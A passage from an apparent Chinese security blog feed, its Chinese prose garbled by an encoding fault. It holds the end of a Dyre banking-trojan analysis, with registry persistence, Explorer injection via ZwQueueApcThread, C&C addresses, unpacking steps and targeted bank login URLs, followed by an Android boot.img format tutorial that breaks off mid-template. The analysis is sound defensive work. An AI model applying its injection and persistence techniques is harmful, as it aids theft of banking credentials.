é™¤è‡ªèº«</li><li>æ³¨å…¥Explorer è¿›ç¨‹</li><li>googleupdaterr.exe è¿›ç¨‹é€€å‡º</li></ul><p>ç”±äºæ³¨å…¥Exploreråï¼Œè¿›ç¨‹é€€å‡ºï¼Œåœ¨ä»»åŠ¡ç®¡ç†å™¨ä¸­çœ‹ä¸åˆ°ä»»ä½•å¯ç–‘è¿›ç¨‹ï¼Œä»£ç åœ¨Explorerä¸­ æ‰§è¡Œã€‚Dyre é€šè¿‡å†™æ³¨å†Œè¡¨å¯åŠ¨é¡¹å®ç°è‡ªå¯åŠ¨ï¼Œç³»ç»Ÿå¯åŠ¨åå°†è‡ªåŠ¨æ‰§è¡Œæ¶æ„æ–‡ä»¶ã€‚</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">key   : HKLM\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN\GoogleUpdate<br>value : <span class="hljs-name">C</span>:\Documents <span class="hljs-keyword">and</span> Settings\sys\Application Data\googleupdaterr.exe<br></code></pre></td></tr></table></figure><h2 id="3-ç½‘ç»œåè®®"><a href="#3-ç½‘ç»œåè®®" class="headerlink" title="3. ç½‘ç»œåè®®"></a>3. ç½‘ç»œåè®®</h2><p>ç”±äºæ—¶é—´è¾ƒé•¿äº†ï¼Œurlé“¾æ¥åŸºæœ¬éƒ½è®¿é—®ä¸äº†äº†ï¼Œæ‰€ä»¥è¿™éƒ¨åˆ†å†…å®¹å°±ä¸é‡ç‚¹è¯´äº†ã€‚<br><a href="http://192.99.6.61/cho1017/W512600.19532DF60D132DC4E0153BE41218BD1A/5/publickey/">http://192.99.6.61/cho1017/W512600.19532DF60D132DC4E0153BE41218BD1A/5/publickey/</a><br>217.12.207.151:8900 å’Œ 192.99.6.61:80 éƒ½å·²å¤±æ•ˆã€‚</p><p>å¯ä»¥å‚è€ƒä¸‹é¢è¿™ç¯‡æ–‡ç« çš„å›¾ç‰‡</p><p><a href="http://phishme.com/project-dyre-new-rat-slurps-bank-credentials-bypasses-ssl/">Project Dyre: New RAT Slurps Bank Credentials, Bypasses SSL</a></p><p>VirusTotal çš„Passive DNS å¯ä»¥ä¹Ÿå¯ä»¥çœ‹åˆ°ä¸€äº›å†…å®¹</p><p><img src="http://2.bp.blogspot.com/-7qnGX4wX1Jo/Vfrgw5tHK0I/AAAAAAAABQw/JVXCbacLraA/s640/%25E5%25B1%258F%25E5%25B9%2595%25E5%25BF%25AB%25E7%2585%25A7%2B2015-09-17%2B%25E4%25B8%258B%25E5%258D%258811.44.25.png" alt="virusTotal"></p><p>ä»é“¾æ¥æä¾›çš„å†…å®¹æ¥çœ‹ï¼ŒDyreä½¿ç”¨HTTPåè®®æ¥è¿›è¡ŒC&amp;Cé€šè®¯ï¼ŒC&amp;CæœåŠ¡å™¨çš„IPåœ¨ä»£ç ä¸­ç¡¬ç¼–ç ã€‚</p><h2 id="4-é«˜çº§æŠ€æœ¯"><a href="#4-é«˜çº§æŠ€æœ¯" class="headerlink" title="4. é«˜çº§æŠ€æœ¯"></a>4. é«˜çº§æŠ€æœ¯</h2><h3 id="4-1-è„±å£³"><a href="#4-1-è„±å£³" class="headerlink" title="4.1 è„±å£³"></a>4.1 è„±å£³</h3><p>è¿™ä¸ªæ ·æœ¬ä½¿ç”¨äº†åæ··æ·†æŠ€æœ¯ï¼Œä¸ä»”ç»†çœ‹çš„è¯å°±åƒä¸€ä¸ªæ­£å¸¸çš„MFCç¨‹åºï¼Œå…¶å®è¿è¡Œåˆ°ä¸€å®šé˜¶æ®µï¼Œ è¿›ç¨‹ç©ºé—´é‡Œæ‰€æœ‰çš„ä»£ç éƒ½è¢«æ›¿æ¢ã€‚è„±å£³è¿‡ç¨‹ä¸­æœªå‘ç°åè°ƒè¯•çš„ç°è±¡ï¼ŒOEPåº”è¯¥æ˜¯4021F0ï¼Œåœ¨ODé‡Œè®¾ç½®ç¡¬ä»¶æ‰§è¡Œæ–­ç‚¹ï¼ŒF9å°±å¯ä»¥dumpäº†ï¼Œä¿®å¤IATåå¯ä»¥æ­£å¸¸è¿è¡Œã€‚</p><h3 id="4-2-è¿›ç¨‹æ³¨å…¥"><a href="#4-2-è¿›ç¨‹æ³¨å…¥" class="headerlink" title="4.2 è¿›ç¨‹æ³¨å…¥"></a>4.2 è¿›ç¨‹æ³¨å…¥</h3><p>æˆ‘ä»¬çš„ç›®æ ‡ä»£ç åº”è¯¥æ˜¯æ³¨å…¥åˆ° Explorer ä¸­çš„ä»£ç ã€‚å…¶å®è„±å£³åçš„æ ·æœ¬çš„èµ„æºæ–‡ä»¶é‡ŒåŒ…å«äº†æ³¨å…¥åˆ°Explorerçš„ä»£ç ï¼Œåˆ†åˆ«æ˜¯PAYLOAD32å’ŒPAYLOAD64.</p><p><img src="http://3.bp.blogspot.com/-C3jyE4a0hCM/VfqDzC5jqgI/AAAAAAAABPw/91b98B1dHmQ/s640/payload.png" alt="resources"></p><p>Dyreçš„è¿›ç¨‹æ³¨å…¥å’Œä¸€èˆ¬çš„æ ·æœ¬æœ‰ä¸€å®šçš„åŒºåˆ«ï¼Œä½¿ç”¨äº†ZwQueueApcThreadæ¥å¯åŠ¨ï¼Œè€Œå¹¶æ²¡æœ‰ä½¿ZwSetContextThreadã€‚åœ¨è·¨è¿›ç¨‹å†™åˆ™ä½¿ç”¨äº†ZwMapViewOfSectionè€Œæ²¡æœ‰ä½¿ç”¨å¤§å®¶ç†Ÿæ‚‰çš„ZwWriteVirtualMemoryï¼Œéšè”½æ€§è¾ƒå¼ºã€‚</p><p><img src="http://4.bp.blogspot.com/-CMW6dQ5QppI/VfrQ455zqhI/AAAAAAAABQQ/5IcOj6LJQRE/s640/injection.png" alt="injection"></p><p>æ–°ç‰ˆçš„Ollydbg 2.01ï¼Œ æ”¯æŒè°ƒè¯•å­è¿›ç¨‹ï¼Œåœ¨å­è¿›ç¨‹ä¸­å¯ä»¥çœ‹åˆ°ä»¥ä¸‹ä»£ç </p><p><img src="http://3.bp.blogspot.com/-eC45mc0InZw/VfqEHblwFgI/AAAAAAAABP4/DvoOTi-sIvc/s640/NtQueueApcThread.png" alt="OD2"><br><img src="http://1.bp.blogspot.com/-KWDSgO7N6VE/VfqEPgtwTPI/AAAAAAAABQA/udrCHhMNvOI/s640/027F0000.png" alt="OD2.1"></p><p>å¯ä»¥ç¡®è®¤æ³¨å…¥çš„ç¡®å®æ˜¯èµ„æºæ–‡ä»¶é‡Œçš„payload</p><h2 id="é™„å½•A"><a href="#é™„å½•A" class="headerlink" title="é™„å½•A"></a>é™„å½•A</h2><h3 id="strings"><a href="#strings" class="headerlink" title="strings"></a>strings</h3><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs mel">cashproonline.bankofamerica.com/AuthenticationFrameworkWeb/cpo/login/public/loginMain.faces<br>businessaccess.citibank.citigroup.com/cbusol/signon.<span class="hljs-keyword">do</span><br>www.bankline.natwest.com/CWSLogon/logon.<span class="hljs-keyword">do</span>?CTAuthMode=RBSG_CORP4P&amp;domain=.bankline.natwest.com&amp;ct-web-server-id=Internet&amp;CT_ORIG_URL=%2Fbankline%2Fnatwest%2Fdefault.jsp&amp;ct_orig_uri=https%3A%2F%2Fwww.bankline.natwest.com%3A443%2Fbankline%2Fnatwest%2Fdefault.jsp<br>www.bankline.rbs.com/CWSLogon/logon.<span class="hljs-keyword">do</span>?CTAuthMode=RBSG_CORP4P&amp;domain=.bankline.rbs.com&amp;ct-web-server-id=Internet&amp;CT_ORIG_URL=%2Fbankline%2Frbs%2Fdefault.jsp&amp;ct_orig_uri=https%3A%2F%2Fwww.bankline.rbs.com%3A443%2Fbankline%2Frbs%2Fdefault.jsp<br>www.bankline.ulsterbank.ie/CWSLogon/logon.<span class="hljs-keyword">do</span>?CTAuthMode=RBSG_CORP4P&amp;domain=.bankline.ulsterbank.ie&amp;ct-web-server-id=Internet&amp;CT_ORIG_URL=%2Fbankline%2Fubr%2Fdefault.jsp&amp;ct_orig_uri=https%3A%2F%2Fwww.bankline.ulsterbank.ie%3A443%2Fbankline%2Fubr%2Fdefault.jsp<br>TRUE<br>AUTOBACKCONN<br>%02x<br>cashproonline.bankofamerica.com/materials<br>user_id=<br>company_id=<br>businessaccess.citibank.citigroup.com/materials<br>business_code=<br>business_name=<br><span class="hljs-number">0</span>x%x<br><span class="hljs-number">85.25</span><span class="hljs-number">.148</span><span class="hljs-number">.6</span><br>c1shproonline.bankofamerica.com<br>cashproonline.bankofamerica.com/AuthenticationFrameworkWeb/<br>cashproonline.bankofamerica.com/assets/<br>b1sinessaccess.citibank.citigroup.com<br>businessaccess.citibank.citigroup.com/assets/<br>businessaccess.citibank.citigroup.com/CitiBusinessOnlineFiles/<br>www.b1nkline.natwest.com<br>www.bankline.natwest.com/<br>www.b1nkline.rbs.com<br>www.bankline.rbs.com/<br>www.b1nkline.ulsterbank.ie<br>www.bankline.ulsterbank.ie/<br></code></pre></td></tr></table></figure><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><p><a href="https://www.virustotal.com/en/file/dc276b0113694ecc62913311e2580857754aa890173dfaa9d95afad6396bb741/analysis/">https://www.virustotal.com/en/file/dc276b0113694ecc62913311e2580857754aa890173dfaa9d95afad6396bb741/analysis/</a><br><a href="https://www.fireeye.com/blog/threat-research/2015/07/dyre_banking_trojan.html">https://www.fireeye.com/blog/threat-research/2015/07/dyre_banking_trojan.html</a><br><a href="https://www.blueliv.com/downloads/documentation/reports/Network_insights_of_Dyre_and_Dridex_Trojan_bankers.pdf">https://www.blueliv.com/downloads/documentation/reports/Network_insights_of_Dyre_and_Dridex_Trojan_bankers.pdf</a><br><a href="https://portal.sec.ibm.com/mss/html/en_US/support_resources/pdf/Dyre_Wolf_MSS_Threat_Report.pdf">https://portal.sec.ibm.com/mss/html/en_US/support_resources/pdf/Dyre_Wolf_MSS_Threat_Report.pdf</a><br><a href="http://www.seculert.com/blog/2015/04/new-dyre-version-evades-sandboxes.html">http://www.seculert.com/blog/2015/04/new-dyre-version-evades-sandboxes.html</a><br><a href="https://blogs.cisco.com/security/talos/threat-spotlight-dyre">https://blogs.cisco.com/security/talos/threat-spotlight-dyre</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Malware</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android boot.img æ ¼å¼åˆ†æ</title>
    <link href="/cn/android_bootimg/"/>
    <url>/cn/android_bootimg/</url>
    
    <content type="html"><![CDATA[<p>é¦–å…ˆéœ€è¦æåˆ°boot.imgï¼Œç½‘ç»œä¸Šæµä¼ çš„æ–¹æ³•æ˜¯é€šè¿‡&#x2F;proc&#x2F;mtd åœ¨è·å–éœ€è¦çš„ä¿¡æ¯</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs dts">&gt; ./adb shell<br>&gt; su<br>&gt; cat <span class="hljs-keyword">/proc/</span>mtd<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">dev:</span>    size   erasesize  name<br><span class="hljs-symbol">mtd0:</span> <span class="hljs-number">00700000</span> <span class="hljs-number">00020000</span> <span class="hljs-string">&quot;boot&quot;</span><br><span class="hljs-symbol">mtd1:</span> <span class="hljs-number">07</span>c20000 <span class="hljs-number">00020000</span> <span class="hljs-string">&quot;cache&quot;</span><br><span class="hljs-symbol">mtd2:</span> <span class="hljs-number">00700000</span> <span class="hljs-number">00020000</span> <span class="hljs-string">&quot;recovery&quot;</span><br><span class="hljs-symbol">mtd3:</span> <span class="hljs-number">00140000</span> <span class="hljs-number">00020000</span> <span class="hljs-string">&quot;splash&quot;</span><br><span class="hljs-symbol">mtd4:</span> <span class="hljs-number">00700000</span> <span class="hljs-number">00020000</span> <span class="hljs-string">&quot;FOTA_STO&quot;</span><br><span class="hljs-symbol">mtd5:</span> <span class="hljs-number">09e80000</span> <span class="hljs-number">00020000</span> <span class="hljs-string">&quot;system&quot;</span><br><span class="hljs-symbol">mtd6:</span> <span class="hljs-number">0</span>a4e0000 <span class="hljs-number">00020000</span> <span class="hljs-string">&quot;userdata&quot;</span><br><span class="hljs-symbol">mtd7:</span> <span class="hljs-number">00080000</span> <span class="hljs-number">00020000</span> <span class="hljs-string">&quot;misc&quot;</span><br><span class="hljs-symbol">mtd8:</span> <span class="hljs-number">00180000</span> <span class="hljs-number">00020000</span> <span class="hljs-string">&quot;persist&quot;</span><br></code></pre></td></tr></table></figure><p>ä½†æ˜¯åœ¨Nexus4, Android 4.4.4 å·²ç»æ‰¾ä¸åˆ°è¿™ä¸ªæ–‡ä»¶äº†</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tcl">&gt; cat /<span class="hljs-keyword">proc</span>/mtd<span class="hljs-title"></span><br><span class="hljs-title"></span><br><span class="hljs-title">cat:</span> /<span class="hljs-keyword">proc</span>/mtd:<span class="hljs-title"> No</span> such<span class="hljs-title"> file</span> or<span class="hljs-title"> directory</span><br></code></pre></td></tr></table></figure><p>ä½†æ˜¯è¿˜æ˜¯æœ‰æ–¹æ³•å¯ä»¥è·å–åˆ°éœ€è¦çš„ä¿¡æ¯ã€‚</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">&gt; mount<br><br><span class="hljs-code">.....</span><br><span class="hljs-code">/dev/block/platform/msm_sdcc.1/by-name/system /system ext4 ro,seclabel,relatime,data=ordered 0 0</span><br><span class="hljs-code">/dev/block/platform/msm_sdcc.1/by-name/cache /cache ext4 rw,seclabel,nosuid,nodev,noatime,data=ordered 0 0</span><br><span class="hljs-code">.....</span><br></code></pre></td></tr></table></figure><p> å¯ä»¥çœ‹åˆ°å¤§è‡´ä¸Šé¢çš„è¾“å‡ºï¼ˆä¸Šé¢çš„è¾“å‡ºçœç•¥äº†éƒ¨åˆ†å†…å®¹ï¼‰ï¼Œä»è¾“å‡ºä¸­å¯ä»¥çœ‹å‡º &#x2F;dev&#x2F;block&#x2F;platform&#x2F;msm_sdcc.1&#x2F;by-name<br>æ˜¯ä¸€ä¸ªæ¯”è¾ƒæœ‰æ„æ€çš„è·¯å¾„ï¼Œæœ‰by-name çš„ä¿¡æ¯ã€‚</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs xl">&gt; ls /dev/<span class="hljs-keyword">block</span>/platform/msm_sdcc.<span class="hljs-number">1</span>/<span class="hljs-keyword">by</span>-<span class="hljs-keyword">name</span>/<br><br><span class="hljs-function"><span class="hljs-title">lrwxrwxrwx</span> root     root              2014-06-30 20:50 DDR -&gt;</span> /dev/<span class="hljs-keyword">block</span>/mmcblk0p24<br><span class="hljs-function"><span class="hljs-title">lrwxrwxrwx</span> root     root              2014-06-30 20:50 aboot -&gt;</span> /dev/<span class="hljs-keyword">block</span>/mmcblk0p12<br><span class="hljs-function"><span class="hljs-title">lrwxrwxrwx</span> root     root              2014-06-30 20:50 abootb -&gt;</span> /dev/<span class="hljs-keyword">block</span>/mmcblk0p15<br><span class="hljs-function"><span class="hljs-title">lrwxrwxrwx</span> root     root              2014-06-30 20:50 boot -&gt;</span> /dev/<span class="hljs-keyword">block</span>/mmcblk0p6<br><span class="hljs-function"><span class="hljs-title">lrwxrwxrwx</span> root     root              2014-06-30 20:50 cache -&gt;</span> /dev/<span class="hljs-keyword">block</span>/mmcblk0p22<br><span class="hljs-function"><span class="hljs-title">lrwxrwxrwx</span> root     root              2014-06-30 20:50 grow -&gt;</span> /dev/<span class="hljs-keyword">block</span>/mmcblk0p25<br><span class="hljs-function"><span class="hljs-title">lrwxrwxrwx</span> root     root              2014-06-30 20:50 m9kefs1 -&gt;</span> /dev/<span class="hljs-keyword">block</span>/mmcblk0p8<br><span class="hljs-function"><span class="hljs-title">lrwxrwxrwx</span> root     root              2014-06-30 20:50 m9kefs2 -&gt;</span> /dev/<span class="hljs-keyword">block</span>/mmcblk0p9<br><span class="hljs-function"><span class="hljs-title">lrwxrwxrwx</span> root     root              2014-06-30 20:50 m9kefs3 -&gt;</span> /dev/<span class="hljs-keyword">block</span>/mmcblk0p10<br><span class="hljs-function"><span class="hljs-title">lrwxrwxrwx</span> root     root              2014-06-30 20:50 metadata -&gt;</span> /dev/<span class="hljs-keyword">block</span>/mmcblk0p18<br><span class="hljs-function"><span class="hljs-title">lrwxrwxrwx</span> root     root              2014-06-30 20:50 misc -&gt;</span> /dev/<span class="hljs-keyword">block</span>/mmcblk0p19<br><span class="hljs-function"><span class="hljs-title">lrwxrwxrwx</span> root     root              2014-06-30 20:50 modem -&gt;</span> /dev/<span class="hljs-keyword">block</span>/mmcblk0p1<br><span class="hljs-function"><span class="hljs-title">lrwxrwxrwx</span> root     root              2014-06-30 20:50 persist -&gt;</span> /dev/<span class="hljs-keyword">block</span>/mmcblk0p20<br><span class="hljs-function"><span class="hljs-title">lrwxrwxrwx</span> root     root              2014-06-30 20:50 recovery -&gt;</span> /dev/<span class="hljs-keyword">block</span>/mmcblk0p7<br><span class="hljs-function"><span class="hljs-title">lrwxrwxrwx</span> root     root              2014-06-30 20:50 rpm -&gt;</span> /dev/<span class="hljs-keyword">block</span>/mmcblk0p11<br><span class="hljs-function"><span class="hljs-title">lrwxrwxrwx</span> root     root              2014-06-30 20:50 rpmb -&gt;</span> /dev/<span class="hljs-keyword">block</span>/mmcblk0p16<br><span class="hljs-function"><span class="hljs-title">lrwxrwxrwx</span> root     root              2014-06-30 20:50 sbl1 -&gt;</span> /dev/<span class="hljs-keyword">block</span>/mmcblk0p2<br><span class="hljs-function"><span class="hljs-title">lrwxrwxrwx</span> root     root              2014-06-30 20:50 sbl2 -&gt;</span> /dev/<span class="hljs-keyword">block</span>/mmcblk0p3<br><span class="hljs-function"><span class="hljs-title">lrwxrwxrwx</span> root     root              2014-06-30 20:50 sbl2b -&gt;</span> /dev/<span class="hljs-keyword">block</span>/mmcblk0p13<br><span class="hljs-function"><span class="hljs-title">lrwxrwxrwx</span> root     root              2014-06-30 20:50 sbl3 -&gt;</span> /dev/<span class="hljs-keyword">block</span>/mmcblk0p4<br><span class="hljs-function"><span class="hljs-title">lrwxrwxrwx</span> root     root              2014-06-30 20:50 sbl3b -&gt;</span> /dev/<span class="hljs-keyword">block</span>/mmcblk0p14<br><span class="hljs-function"><span class="hljs-title">lrwxrwxrwx</span> root     root              2014-06-30 20:50 system -&gt;</span> /dev/<span class="hljs-keyword">block</span>/mmcblk0p21<br><span class="hljs-function"><span class="hljs-title">lrwxrwxrwx</span> root     root              2014-06-30 20:50 tz -&gt;</span> /dev/<span class="hljs-keyword">block</span>/mmcblk0p5<br><span class="hljs-function"><span class="hljs-title">lrwxrwxrwx</span> root     root              2014-06-30 20:50 tzb -&gt;</span> /dev/<span class="hljs-keyword">block</span>/mmcblk0p17<br><span class="hljs-function"><span class="hljs-title">lrwxrwxrwx</span> root     root              2014-06-30 20:50 userdata -&gt;</span> /dev/<span class="hljs-keyword">block</span>/mmcblk0p23<br></code></pre></td></tr></table></figure><p>å“ˆå“ˆï¼Œä¸€æ¸…äºŒæ¥šã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt; <span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/block/mmcblk0p6 of=/sdcard/boot.img bs=4096<br>5632+0 records <span class="hljs-keyword">in</span><br>5632+0 records out<br>23068672 bytes transferred <span class="hljs-keyword">in</span> 2.398 secs (9619963 bytes/sec)<br><br>&gt;./adb pull /sdcard/boot.img /tmp/boot.img<br>4270 KB/s (23068672 bytes <span class="hljs-keyword">in</span> 5.275s)<br></code></pre></td></tr></table></figure><p> boot.img ä¸»è¦ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼Œkernel å’Œ ramdiskï¼Œä¸‹é¢ä½¿ç”¨010editoræ¥å†™ä¸€ä¸ªæ¨¡ç‰ˆï¼Œè§£æboot.imgã€‚ä»Androidçš„æºç å¯ä»¥çŸ¥é“boot.imgçš„ç»“æ„ app&#x2F;aboot&#x2F;bootimg.h</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">+-----------------+</span> <br><span class="hljs-section">| boot header     | 1 page</span><br><span class="hljs-section">+-----------------+</span><br><span class="hljs-section">| kernel          | n pages</span><br><span class="hljs-section">+-----------------+</span><br><span class="hljs-section">| ramdisk         | m pages</span><br><span class="hljs-section">+-----------------+</span><br><span class="hljs-section">| second stage    | o pages</span><br><span class="hljs-section">+-----------------+</span><br><span class="hljs-section">| device tree     | p pages</span><br><span class="hljs-section">+-----------------+</span><br></code></pre></td></tr></table></figure><pre><code class="hljs">  boot header çš„ç»“æ„å®šä¹‰å¦‚ä¸‹ï¼š</code></pre><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">boot_img_hdr</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> magic[BOOT_MAGIC_SIZE];<br>    <span class="hljs-type">unsigned</span> kernel_size;  <span class="hljs-comment">/* size in bytes */</span><br>    <span class="hljs-type">unsigned</span> kernel_addr;  <span class="hljs-comment">/* physical load addr */</span><br>    <span class="hljs-type">unsigned</span> ramdisk_size; <span class="hljs-comment">/* size in bytes */</span><br>    <span class="hljs-type">unsigned</span> ramdisk_addr; <span class="hljs-comment">/* physical load addr */</span><br>    <span class="hljs-type">unsigned</span> second_size;  <span class="hljs-comment">/* size in bytes */</span><br>    <span class="hljs-type">unsigned</span> second_addr;  <span class="hljs-comment">/* physical load addr */</span><br>    <span class="hljs-type">unsigned</span> tags_addr;    <span class="hljs-comment">/* physical addr for kernel tags */</span><br>    <span class="hljs-type">unsigned</span> page_size;    <span class="hljs-comment">/* flash page size we assume */</span><br>    <span class="hljs-type">unsigned</span> dt_size;      <span class="hljs-comment">/* device_tree in bytes */</span><br>    <span class="hljs-type">unsigned</span> unused;    <span class="hljs-comment">/* future expansion: should be 0 */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> name[BOOT_NAME_SIZE]; <span class="hljs-comment">/* asciiz product name */</span><br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> cmdline[BOOT_ARGS_SIZE];<br>    <span class="hljs-type">unsigned</span> id[<span class="hljs-number">8</span>]; <span class="hljs-comment">/* timestamp / checksum / sha1 / etc */</span><br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="010editor-æ¨¡æ¿"><a href="#010editor-æ¨¡æ¿" class="headerlink" title="010editor æ¨¡æ¿"></a>010editor æ¨¡æ¿</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> BOOT_MAGIC_SIZE 8</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BOOT_NAME_SIZE 16</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BOOT_ARGS_SIZE 512</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">boot_img_hdr</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> magic[BOOT_MAGIC_SIZE];<br>    uint kernel_size;  <span class="hljs-comment">/* size in bytes */</span><br>    uint kernel_addr;  <span class="hljs-comment">/* physical load addr */</span><br>    uint ramdisk_size; <span class="hljs-comment">/* size in bytes */</span><br>    uint ramdisk_addr; <span class="hljs-comment">/* physical load addr */</span><br>    uint second_size;  <span class="hljs-comment">/* size in bytes */</span><br>    uint second_addr;  <span class="hljs-comment">/* physical load addr */</span><br>    uint tags_addr;    <span class="hljs-comment">/* physical addr for kernel tags */</span><br>    uint page_size;    <span class="hljs-comment">/* flash page size we assume */</span><br>    uint dt_size;      <span class="hljs-comment">/* device_tree in bytes */</span><br>    uint unused;    <span class="hljs-comment">/* future expansion: should be 0 */</span><br>    ubyte name[BOOT_NAME_SIZE]; <span class="hljs-comment">/* asciiz product name */</span><br>    <br>    ubyte cmdline[BOOT_ARGS_SIZE];<br>    uint id[<span class="hljs-number">8</span>]; <span class="hljs-comment">/* timestamp / checksum / sha1 / etc */</span><br>&#125;BOOT_IMG_HDR;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">boot_hdr</span> &#123;</span><br>    BOOT_IMG_HDR header;<br>    ubyte unused[header.page_size - <span class="hljs-keyword">sizeof</span>(header)];<br>&#125;HEADER;<br><br>LittleEndian();<br>HEADER header_section;<br><br>local uint page_size = header_section.header.page_size;<br>local uint kernel_size = header_section.header.kernel_size;<br>local uint ramdisk_size = header_section.header.ramdisk_size;<br>local uint second_size = header_section.header.second_size;<br><br>Printf(<span class="hljs-string">&quot;page_size: %x\nkernel_size: %x\nramdisk_size: %x\nsecond_size: %x\n&quot;</span>, page_size, kernel_size, ramdisk_size, second_size);<br><br>local uint n = (kernel_size + page_size - <span class="hljs-number">1</span>) / page_size;<br>local uint m = (ramdisk_size + page_size - <span class="hljs-number">1</span>) / page_size; <br>local uint o = (second_size + page_size - <span class="hljs-number">1</span>) / page_size;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kernel</span> &#123;</span><br>    ubyte kernel_data[kernel_size];<br>    ubyte unused[n * page_size - kernel_size];<br>&#125;KERNEL;<br><br>KERNEL kernel_section;<br><br><span 